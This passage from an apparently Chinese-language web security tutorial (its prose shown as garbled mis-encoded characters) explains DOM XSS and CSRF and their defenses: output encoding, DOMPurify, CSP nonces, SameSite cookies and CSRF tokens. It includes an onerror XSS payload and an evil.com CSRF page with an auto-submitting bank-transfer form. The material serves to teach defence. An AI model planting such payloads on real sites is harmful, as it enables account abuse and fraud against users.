<p>æ”»å‡»è€…éœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ç‰¹å®šé“¾æ¥æ‰èƒ½è§¦å‘ï¼Œä½†ä¼ æ’­æ€§å¾ˆå¼ºï¼Œå¯ä»¥é€šè¿‡é’“é±¼é‚®ä»¶ã€ç¤¾äº¤åª’ä½“ç­‰æ–¹å¼å¤§é‡æ•£æ’­ã€‚</p>
<p><strong>DOM å‹ XSS</strong></p>
<p>çº¯å‰ç«¯çš„é—®é¢˜ï¼Œä¸ç»è¿‡æœåŠ¡å™¨ã€‚ç›´æ¥ç”¨ URL å‚æ•°æ“ä½œ DOMï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// URL: https://example.com#&lt;img src=x onerror=alert('XSS')&gt;</span>

<span class="hljs-keyword">const</span> hash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'output'</span>).<span class="hljs-property">innerHTML</span> = hash;  <span class="hljs-comment">// ä¸­æ‹›äº†</span>
</code></pre>
<h3 data-id="heading-2">é˜²å¾¡ XSS çš„å®Œæ•´æ–¹æ¡ˆ</h3>
<p><strong>1. è¾“å‡ºç¼–ç ï¼ˆæ ¹æ®ä¸Šä¸‹æ–‡é€‰æ‹©ï¼‰</strong></p>
<p>ä¸åŒä½ç½®éœ€è¦ä¸åŒçš„ç¼–ç æ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// HTML ä¸Šä¸‹æ–‡ï¼šè½¬ä¹‰ &amp; &lt; &gt; " '</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHtml</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">const</span> map = {
    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'&amp;amp;'</span>,
    <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'&amp;lt;'</span>,
    <span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'&amp;gt;'</span>,
    <span class="hljs-string">'"'</span>: <span class="hljs-string">'&amp;quot;'</span>,
    <span class="hljs-string">"'"</span>: <span class="hljs-string">'&amp;#x27;'</span>
  };
  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;"']/g</span>, <span class="hljs-function">(<span class="hljs-params">char</span>) =&gt;</span> map[char]);
}

<span class="hljs-comment">// URL å‚æ•°ï¼šä½¿ç”¨ encodeURIComponent</span>
<span class="hljs-keyword">const</span> url = <span class="hljs-string">`https://example.com/search?q=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(userInput)}</span>`</span>;

<span class="hljs-comment">// JavaScript å­—ç¬¦ä¸²ï¼šä½¿ç”¨ JSON.stringify æˆ– Unicode ç¼–ç </span>
<span class="hljs-keyword">const</span> safeStr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userInput);

<span class="hljs-comment">// CSS ä¸Šä¸‹æ–‡ï¼šè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦æˆ–ç¦æ­¢ç”¨æˆ·è¾“å…¥å½±å“æ ·å¼</span>
<span class="hljs-comment">// æœ€å¥½åˆ«è®©ç”¨æˆ·è¾“å…¥ç›´æ¥å½±å“ CSS</span>
</code></pre>
<p>å®é™…ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨</span>
element.<span class="hljs-property">innerHTML</span> = escapeHtml(userInput);
</code></pre>
<p><strong>2. ä½¿ç”¨å®‰å…¨çš„ API</strong></p>
<p>ä¸è¦ç”¨ <code>innerHTML</code>ï¼Œç”¨ <code>textContent</code> æˆ– <code>innerText</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å±é™©</span>
element.<span class="hljs-property">innerHTML</span> = userInput;

<span class="hljs-comment">// å®‰å…¨</span>
element.<span class="hljs-property">textContent</span> = userInput;

<span class="hljs-comment">// Vue/React é‡Œä¹Ÿä¸€æ ·</span>
<span class="hljs-comment">// å±é™©ï¼š&lt;div v-html="userInput"&gt;&lt;/div&gt;</span>
<span class="hljs-comment">// å®‰å…¨ï¼š&lt;div&gt;{{ userInput }}&lt;/div&gt;</span>
</code></pre>
<p>ç°ä»£æ¡†æ¶ï¼ˆReactã€Vueã€Angularï¼‰é»˜è®¤ä¼šåšè½¬ä¹‰ï¼Œä½†è¦æ³¨æ„"é€ƒç”Ÿèˆ±å£"ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// React - å±é™©çš„ API</span>
&lt;div dangerouslySetInnerHTML={{ <span class="hljs-attr">__html</span>: userContent }} /&gt;

<span class="hljs-comment">// Vue - å±é™©çš„æŒ‡ä»¤</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// Angular - å±é™©çš„æ–¹å¼</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> [<span class="hljs-attr">innerHTML</span>]=<span class="hljs-string">"userContent"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>

<span class="hljs-comment">// è¿™äº›åœ°æ–¹éœ€è¦æ‰‹åŠ¨å‡€åŒ–</span>
</code></pre>
<p><strong>3. HTML å‡€åŒ–åº“</strong></p>
<p>å¦‚æœå¿…é¡»æ¸²æŸ“å¯Œæ–‡æœ¬ï¼ˆæ¯”å¦‚åšå®¢ã€è®ºå›çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼‰ï¼Œç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcure53%2FDOMPurify" target="_blank" title="https://github.com/cure53/DOMPurify" ref="nofollow noopener noreferrer">DOMPurify</a> æ¸…ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">DOMPurify</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'dompurify'</span>;

<span class="hljs-keyword">const</span> dirty = <span class="hljs-string">'&lt;img src=x onerror=alert("XSS")&gt;'</span>;
<span class="hljs-keyword">const</span> clean = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty);
element.<span class="hljs-property">innerHTML</span> = clean;  <span class="hljs-comment">// å®‰å…¨</span>

<span class="hljs-comment">// é…ç½®å…è®¸çš„æ ‡ç­¾å’Œå±æ€§</span>
<span class="hljs-keyword">const</span> clean2 = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(dirty, {
  <span class="hljs-attr">ALLOWED_TAGS</span>: [<span class="hljs-string">'p'</span>, <span class="hljs-string">'strong'</span>, <span class="hljs-string">'em'</span>, <span class="hljs-string">'a'</span>],
  <span class="hljs-attr">ALLOWED_ATTR</span>: [<span class="hljs-string">'href'</span>, <span class="hljs-string">'title'</span>]
});
</code></pre>
<p>DOMPurify ä¼šç§»é™¤æ‰€æœ‰æ½œåœ¨å±é™©çš„æ ‡ç­¾å’Œå±æ€§ï¼ˆ<code>&lt;script&gt;</code>ã€<code>onerror</code>ã€<code>javascript:</code> ç­‰ï¼‰ï¼ŒåŒæ—¶ä¿ç•™åˆæ³•çš„ HTML ç»“æ„ã€‚</p>
<p><strong>4. HttpOnly Cookie</strong></p>
<p>è®¾ç½® Cookie æ—¶åŠ ä¸Š <code>HttpOnly</code>ï¼ŒJavaScript å°±è¯»ä¸åˆ°ï¼ŒXSS æ”»å‡»ä¹Ÿå·ä¸èµ°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// JavaScript è®¿é—®ä¸åˆ°</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// åªåœ¨ HTTPS ä¸‹å‘é€</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span> <span class="hljs-comment">// è·¨ç«™è¯·æ±‚ä¸å‘é€</span>
});
</code></pre>
<p><strong>5. Content Security Policy (CSP)</strong></p>
<p>CSP æ˜¯æµè§ˆå™¨çº§åˆ«çš„é˜²æŠ¤ï¼Œé€šè¿‡ HTTP å“åº”å¤´é™åˆ¶é¡µé¢èƒ½åŠ è½½å“ªäº›èµ„æºã€‚è®¾ç½®å¥½ CSPï¼Œå³ä½¿æœ‰ XSS æ¼æ´ï¼Œæ”»å‡»è€…ä¹Ÿå¾ˆéš¾åˆ©ç”¨ã€‚</p>
<p>é€šè¿‡ HTTP å“åº”å¤´è®¾ç½®ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy: default-src <span class="hljs-string">'self'</span>; script-<span class="hljs-attribute">src</span> 'self' 'nonce-abc123'; style-<span class="hljs-attribute">src</span> 'self' 'unsafe-inline'; <span class="hljs-selector-tag">img</span>-<span class="hljs-attribute">src</span> *; <span class="hljs-selector-tag">object</span>-<span class="hljs-attribute">src</span> '<span class="hljs-attribute">none</span>'
</code></pre>
<p>æˆ–è€…ç”¨ meta æ ‡ç­¾ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Security-Policy"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"default-src 'self'; script-src 'self' https://trusted.com"</span>&gt;</span>
</code></pre>
<p>è¿™ä¸ªç­–ç•¥çš„æ„æ€æ˜¯ï¼š</p>
<ul>
<li><code>default-src 'self'</code>ï¼šé»˜è®¤åªèƒ½åŠ è½½åŒæºèµ„æº</li>
<li><code>script-src 'self' 'nonce-abc123'</code>ï¼šè„šæœ¬åªèƒ½æ¥è‡ªåŒæºæˆ–å¸¦æœ‰ç‰¹å®š nonce çš„å†…è”è„šæœ¬</li>
<li><code>object-src 'none'</code>ï¼šç¦æ­¢ <code>&lt;object&gt;</code>ã€<code>&lt;embed&gt;</code> æ ‡ç­¾</li>
</ul>
<p><strong>CSP æŒ‡ä»¤è¯¦è§£</strong></p>
<pre><code class="hljs language-perl" lang="perl">Content-Security-Policy:
  default-src <span class="hljs-string">'none'</span>;                                 <span class="hljs-comment"># é»˜è®¤ç¦æ­¢æ‰€æœ‰</span>
  script-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span> https:<span class="hljs-regexp">//</span>cdn.example.com;  <span class="hljs-comment"># è„šæœ¬æ¥æº</span>
  style-src <span class="hljs-string">'self'</span> <span class="hljs-string">'nonce-randomvalue'</span>;               <span class="hljs-comment"># æ ·å¼æ¥æº</span>
  img-src <span class="hljs-string">'self'</span> data: https:;                        <span class="hljs-comment"># å›¾ç‰‡æ¥æº</span>
  font-src <span class="hljs-string">'self'</span> https:<span class="hljs-regexp">//</span>fonts.gstatic.com;          <span class="hljs-comment"># å­—ä½“æ¥æº</span>
  <span class="hljs-keyword">connect</span>-src <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># Ajax/WebSocket è¿æ¥</span>
  frame-ancestors <span class="hljs-string">'none'</span>;                             <span class="hljs-comment"># é˜²æ­¢è¢«åµŒå…¥ iframe</span>
  base-uri <span class="hljs-string">'self'</span>;                                    <span class="hljs-comment"># é™åˆ¶ &lt;base&gt; æ ‡ç­¾</span>
  form-action <span class="hljs-string">'self'</span>;                                 <span class="hljs-comment"># è¡¨å•æäº¤åœ°å€</span>
</code></pre>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li>é¿å…ä½¿ç”¨ <code>'unsafe-inline'</code> å’Œ <code>'unsafe-eval'</code>ï¼Œå®ƒä»¬ä¼šå‰Šå¼± CSP ä¿æŠ¤</li>
<li>ç”¨ <code>nonce</code> æˆ– <code>hash</code> ä»£æ›¿ <code>unsafe-inline</code></li>
<li><code>frame-ancestors</code> é˜²æ­¢ç‚¹å‡»åŠ«æŒ</li>
<li>é…ç½® <code>report-uri</code> æ”¶é›†è¿è§„æŠ¥å‘Š</li>
</ul>
<p><strong>nonce çš„æ­£ç¡®ç”¨æ³•</strong></p>
<p>æœåŠ¡å™¨ä¸ºæ¯ä¸ªè¯·æ±‚ç”Ÿæˆéšæœº nonceï¼Œå†…è”è„šæœ¬å¿…é¡»åŒ¹é…ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æœåŠ¡å™¨æ¯æ¬¡è¯·æ±‚ç”Ÿæˆæ–°çš„ nonce --&gt;</span>
<span class="hljs-comment">&lt;!-- å“åº”å¤´ --&gt;</span>
Content-Security-Policy: script-src 'nonce-abc123'

<span class="hljs-comment">&lt;!-- HTML --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"abc123"</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Allowed'</span>);  <span class="hljs-comment">// è¿™ä¸ªè„šæœ¬å¯ä»¥æ‰§è¡Œ</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Blocked'</span>);  <span class="hljs-comment">// æ”»å‡»è€…æ³¨å…¥çš„è„šæœ¬ï¼Œæ²¡æœ‰ nonceï¼Œè¢«æ‹¦æˆª</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>åç«¯ç”Ÿæˆ nonce çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express ä¸­é—´ä»¶</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-comment">// æ¯æ¬¡è¯·æ±‚ç”Ÿæˆæ–°çš„ nonce</span>
  res.<span class="hljs-property">locals</span>.<span class="hljs-property">nonce</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'base64'</span>);
  res.<span class="hljs-title function_">setHeader</span>(
    <span class="hljs-string">'Content-Security-Policy'</span>,
    <span class="hljs-string">`script-src 'nonce-<span class="hljs-subst">${res.locals.nonce}</span>'`</span>
  );
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>Report-Only æ¨¡å¼</strong></p>
<p>å…ˆç”¨ <code>Content-Security-Policy-Report-Only</code> æµ‹è¯•ï¼Œä¸ä¼šçœŸçš„é˜»æ­¢èµ„æºï¼Œåªæ˜¯ä¸ŠæŠ¥è¿è§„ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">Content</span>-Security-Policy-Report-Only: default-src <span class="hljs-string">'self'</span>; report-uri /csp-report
</code></pre>
<p>çœ‹çœ‹æœ‰å“ªäº›èµ„æºè¿è§„ï¼Œè°ƒæ•´ç­–ç•¥åå†æ­£å¼å¯ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-3">CSRFï¼šå€Ÿåˆ€æ€äºº</h2>
<p>CSRFï¼ˆCross-Site Request Forgeryï¼Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰çš„åŸç†æ˜¯ï¼šç”¨æˆ·ç™»å½•äº† A ç½‘ç«™ï¼ŒCookie é‡Œæœ‰ä¼šè¯ä¿¡æ¯ã€‚ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™ Bï¼ŒB ç½‘ç«™å‘ A å‘è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š A çš„ Cookieï¼ŒA ç½‘ç«™ä»¥ä¸ºæ˜¯ç”¨æˆ·æœ¬äººçš„æ“ä½œã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant ç”¨æˆ·
    participant é“¶è¡Œç½‘ç«™
    participant æ¶æ„ç½‘ç«™

    ç”¨æˆ·-&gt;&gt;é“¶è¡Œç½‘ç«™: 1. ç™»å½•é“¶è¡Œç½‘ç«™
    é“¶è¡Œç½‘ç«™-&gt;&gt;ç”¨æˆ·: 2. è¿”å›ä¼šè¯Cookie
    ç”¨æˆ·-&gt;&gt;æ¶æ„ç½‘ç«™: 3. è®¿é—®æ¶æ„ç½‘ç«™
    æ¶æ„ç½‘ç«™-&gt;&gt;ç”¨æˆ·: 4. é¡µé¢åŒ…å«éšè—è¯·æ±‚
    ç”¨æˆ·-&gt;&gt;é“¶è¡Œç½‘ç«™: 5. æµè§ˆå™¨è‡ªåŠ¨å‘é€è¯·æ±‚(å¸¦Cookie)
    é“¶è¡Œç½‘ç«™-&gt;&gt;é“¶è¡Œç½‘ç«™: 6. éªŒè¯Cookieæœ‰æ•ˆï¼Œæ‰§è¡Œè½¬è´¦
    Note over ç”¨æˆ·: ç”¨æˆ·å®Œå…¨ä¸çŸ¥æƒ…
</code></pre>
<h3 data-id="heading-4">æ”»å‡»ç¤ºä¾‹</h3>
<p>ç”¨æˆ·ç™»å½•äº†é“¶è¡Œç½‘ç«™ <code>bank.com</code>ï¼ŒCookie è¿˜æœ‰æ•ˆã€‚è¿™æ—¶å€™è®¿é—®äº†æ¶æ„ç½‘ç«™ <code>evil.com</code>ï¼Œæ¶æ„ç½‘ç«™é‡Œæœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æ–¹å¼1ï¼šéšè—å›¾ç‰‡ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://bank.com/transfer?to=attacker&amp;amount=1000"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- æ–¹å¼2ï¼šè‡ªåŠ¨æäº¤è¡¨å• --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://bank.com/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"evilForm"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"10000"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'evilForm'</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š <code>bank.com</code> çš„ Cookie å‘è¯·æ±‚ï¼Œé’±å°±è½¬èµ°äº†ã€‚ç”¨æˆ·å®Œå…¨ä¸çŸ¥æƒ…ã€‚</p>
<h3 data-id="heading-5">é˜²å¾¡ CSRF çš„å®Œæ•´æ–¹æ¡ˆ</h3>
<p><strong>1. CSRF Tokenï¼ˆæœ€å¯é ï¼‰</strong></p>
<p>æœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªéšæœº tokenï¼Œå­˜åœ¨ session é‡Œï¼ŒåŒæ—¶æ”¾åˆ°é¡µé¢çš„éšè—å­—æ®µæˆ–è¯·æ±‚å¤´ä¸­ã€‚æäº¤æ—¶éªŒè¯ token æ˜¯å¦åŒ¹é…ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯ä»é¡µé¢è·å– token</span>
<span class="hljs-keyword">const</span> csrfToken = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'meta[name="csrf-token"]'</span>).<span class="hljs-property">content</span>;

<span class="hljs-comment">// æ–¹å¼1ï¼šæ”¾åœ¨è¯·æ±‚å¤´</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/transfer'</span>, {
  <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
  <span class="hljs-attr">headers</span>: {
    <span class="hljs-string">'X-CSRF-Token'</span>: csrfToken,
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
  },
  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">to</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">100</span> })
});

<span class="hljs-comment">// æ–¹å¼2ï¼šæ”¾åœ¨è¡¨å•éšè—å­—æ®µ</span>
<span class="hljs-comment">// &lt;input type="hidden" name="_csrf" value="token-from-server"&gt;</span>
</code></pre>
<p>åç«¯éªŒè¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Express ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> csrf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);
<span class="hljs-keyword">const</span> csrfProtection = <span class="hljs-title function_">csrf</span>({ <span class="hljs-attr">cookie</span>: <span class="hljs-literal">true</span> });

app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/transfer'</span>, csrfProtection, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// token éªŒè¯é€šè¿‡æ‰ä¼šåˆ°è¿™é‡Œ</span>
  <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦é€»è¾‘</span>
});
</code></pre>
<p>æ”»å‡»è€…æ²¡æ³•è·å–è¿™ä¸ª tokenï¼ˆè·¨åŸŸæ‹¿ä¸åˆ°é¡µé¢å†…å®¹ï¼‰ï¼Œä¼ªé€ çš„è¯·æ±‚å°±ä¼šå¤±è´¥ã€‚</p>
<p><strong>2. SameSite Cookieï¼ˆç°ä»£æµè§ˆå™¨é»˜è®¤é˜²æŠ¤ï¼‰</strong></p>
<p>Cookie åŠ ä¸Š <code>SameSite</code> å±æ€§ï¼Œè·¨ç«™è¯·æ±‚å°±ä¸ä¼šå¸¦ Cookieï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'sessionId'</span>, <span class="hljs-string">'xxx'</span>, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>  <span class="hljs-comment">// æˆ–è€… 'lax'</span>
});
</code></pre>
<p>ä¸‰ä¸ªå€¼çš„åŒºåˆ«ï¼š</p>
<ul>
<li><code>Strict</code>ï¼šè·¨ç«™è¯·æ±‚å®Œå…¨ä¸å‘é€ Cookieï¼Œæœ€å®‰å…¨ä½†å¯èƒ½å½±å“ç”¨æˆ·ä½“éªŒï¼ˆä»å¤–éƒ¨é“¾æ¥ç‚¹è¿›æ¥ä¹Ÿæ²¡ Cookieï¼Œéœ€è¦é‡æ–°ç™»å½•ï¼‰</li>
<li><code>Lax</code>ï¼šGET è¯·æ±‚çš„é¡¶çº§å¯¼èˆªå¯ä»¥å‘é€ï¼ˆæ¯”å¦‚ç‚¹é“¾æ¥ï¼‰ï¼ŒPOST ä¸å‘é€ã€‚å¤§å¤šæ•°åœºæ™¯å¤Ÿç”¨ï¼ŒChrome 80 ä¹‹åçš„é»˜è®¤å€¼</li>
<li><code>None</code>ï¼šéƒ½å‘é€ï¼Œä½†å¿…é¡»é…åˆ <code>Secure</code>ï¼ˆä»… HTTPSï¼‰</li>
</ul>
<p>å®é™…æ•ˆæœï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”¨æˆ·åœ¨ bank.com ç™»å½•ï¼ŒCookie è®¾ç½®ä¸º SameSite=Strict</span>

<span class="hljs-comment">// åœºæ™¯1ï¼šä»å¤–éƒ¨é“¾æ¥ï¼ˆevil.comï¼‰ç‚¹å‡»è·³è½¬åˆ° bank.com</span>
<span class="hljs-comment">// ç»“æœï¼šCookie ä¸ä¼šå‘é€ï¼Œç”¨æˆ·éœ€è¦é‡æ–°ç™»å½•</span>

<span class="hljs-comment">// åœºæ™¯2ï¼ševil.com çš„è„šæœ¬å‘èµ·å¯¹ bank.com çš„è¯·æ±‚</span>
<span class="hljs-comment">// ç»“æœï¼šCookie ä¸ä¼šå‘é€ï¼Œè¯·æ±‚å¤±è´¥</span>

<span class="hljs-comment">// åœºæ™¯3ï¼šbank.com å†…éƒ¨çš„é“¾æ¥è·³è½¬</span>
<span class="hljs-comment">// ç»“æœï¼šCookie æ­£å¸¸å‘é€</span>
</code></pre>
<p>Chrome ä» 2020 å¹´å¼€å§‹ï¼Œæ²¡è®¾ç½® SameSite çš„ Cookie é»˜è®¤å½“ä½œ <code>Lax</code> å¤„ç†ï¼Œå¤§å¤§æå‡äº†å®‰å…¨æ€§ã€‚</p>
<p><strong>3. éªŒè¯ Origin/Referer å¤´</strong></p>
<p>æ£€æŸ¥è¯·æ±‚çš„ <code>Origin</code> æˆ– <code>Referer</code> å¤´ï¼Œæ‹’ç»æ¥è‡ªå…¶ä»–åŸŸçš„è¯·æ±‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯éªŒè¯</span>
<span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span> || req.<span class="hljs-property">headers</span>.<span class="hljs-property">referer</span>;

<span class="hljs-keyword">if</span> (!origin || !origin.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'https://yoursite.com'</span>)) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'Forbidden'</span>);
}
</code></pre>
<p>ä½†è¿™ä¸ªæ–¹æ³•æœ‰å±€é™æ€§ï¼š</p>
<ul>
<li>æŸäº›æƒ…å†µä¸‹è¿™ä¸¤ä¸ªå¤´å¯èƒ½ä¸å­˜åœ¨ï¼ˆéšç§è®¾ç½®ã€ä»£ç†ï¼‰</li>
<li>å¯ä»¥ä½œä¸ºé¢å¤–é˜²æŠ¤å±‚ï¼Œä½†ä¸åº”å•ç‹¬ä¾èµ–</li>
</ul>
<p><strong>4. åŒé‡ Cookie éªŒè¯</strong></p>
<p>å°† token åŒæ—¶å­˜åœ¨ Cookie å’Œè¯·æ±‚å‚æ•°ä¸­ï¼ŒæœåŠ¡å™¨æ¯”å¯¹ä¸¤è€…æ˜¯å¦ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç™»å½•æ—¶è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'csrf_token'</span>, token);

<span class="hljs-comment">// å‰ç«¯å‘è¯·æ±‚æ—¶ï¼Œä» cookie è¯»å– token å¹¶æ”¾åˆ°è¯·æ±‚å¤´</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'csrf_token='</span>)[<span class="hljs-number">1</span>];
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/action'</span>, {
  <span class="hljs-attr">headers</span>: { <span class="hljs-string">'X-CSRF-Token'</span>: token }
});

<span class="hljs-comment">// åç«¯éªŒè¯</span>
<span class="hljs-keyword">const</span> cookieToken = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">csrf_token</span>;
<span class="hljs-keyword">const</span> headerToken = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-csrf-token'</span>];
<span class="hljs-keyword">if</span> (cookieToken !== headerToken) {
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'CSRF token mismatch'</span>);
}
</code></pre>
<p>æ”»å‡»è€…çš„è·¨ç«™è¯·æ±‚è™½ç„¶èƒ½è‡ªåŠ¨å¸¦ä¸Š Cookieï¼Œä½†æ— æ³•è¯»å– Cookie å†…å®¹ï¼Œä¹Ÿå°±æ‹¿ä¸åˆ° token æ”¾åˆ°è¯·æ±‚å¤´é‡Œã€‚</p>
<hr/>
